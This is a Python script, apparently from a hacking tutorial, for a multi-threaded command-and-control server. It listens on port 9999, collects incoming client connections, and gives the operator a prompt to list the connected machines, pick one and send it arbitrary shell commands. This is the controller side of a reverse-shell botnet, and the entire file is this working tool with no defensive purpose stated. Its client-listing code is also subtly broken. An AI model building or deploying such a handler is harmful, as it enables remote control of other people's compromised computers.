"""

# Creating multi-threading server
# STEPS:
    #1-creating socket
    #2-binding socket
    #3-accepting_connections
    #4-printing list of clients
    #5-selecting one specific client
    #6-sending commands to that client

"""

import socket
import threading
import sys
from queue import Queue

connections = []
addresses = []
total_threads = 2
thread_number = [1,2]
queue = Queue()

def create_socket():

    global host, port, s

    host = ''
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('[**] socket created')

def bind_socket():

    try:
        global host
        global port
        global s

        s.bind((host,port))
        s.listen(5)
        print('[**] socket binded ')
        print('[**] Listening on host {} | port {}'.format(host,port))

    except socket.error as error:
        print('socket binding error: ' + str(error)+'\n'+'Retrying..')


def accept_connections():

    for connection in connections:
        connection.close()

    del connections[:]
    del addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            connections.append(conn)
            addresses.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")

## first thread tasks completed
## second thread tasks start

def ug_python():

    while True:

        cmd = input('UG_PYTHON~$: ')

        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)

        else:
            print('[!!] Command not recognized!')


def list_connections():

    results = ''

    for i, conn in enumerate(connections):
        try:
            conn.send(str.encode(''))
            conn.recv(1024)

        except:
            del connections[:]
            del addresses[:]
            continue

    results = str(i) + '    ' + str(addresses[i][0]) + '    ' + str(addresses[i][1]) + '\n'
    print('------Clients------' + '\n', results)

def get_target(cmd):

    try:
        target = cmd.replace('select ','')
        target = int(target)

        conn = connections[target]
        print('You are now connected to: ' + str(addresses[target][0]))
        print(str(addresses[target][0]) + '> ', end = '')
        return conn

    except:
        print('Selection not valid!')
        return None

def send_commands(conn):

    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = conn.recv(1024).decode('utf-8')
                print(client_response, end = '')

        except:
            print('command sending error!')
            break

def threads():

    for num in range(total_threads):
        thread = threading.Thread(target = work)
        thread.daemon = True
        thread.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()

        if x == 2:
            ug_python()

        queue.task_done()

def job():

    for x in thread_number:
        queue.put(x)

    queue.join()

threads()
job()
